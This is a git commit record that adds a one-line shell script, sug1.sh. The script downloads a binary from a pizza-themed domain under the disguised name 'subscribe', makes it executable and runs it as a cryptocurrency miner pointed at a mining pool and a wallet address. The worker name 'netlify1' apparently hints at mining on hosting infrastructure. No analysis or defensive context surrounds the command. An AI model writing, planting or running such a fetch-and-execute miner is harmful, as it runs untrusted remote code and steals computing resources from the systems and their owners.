17d6fe92e26e52b50d4ce8203968a07fdc529975
magdamana001 <86566264+magdamana001@users.noreply.github.com>
2021-12-04 09:48:13 +0100

    Create sug1.sh

---
+++ sug1.sh
@@ -0,0 +1,1 @@
+wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qqajgyduug8lwup6waqp8qe3mzsm598g9wms4j5.netlify1
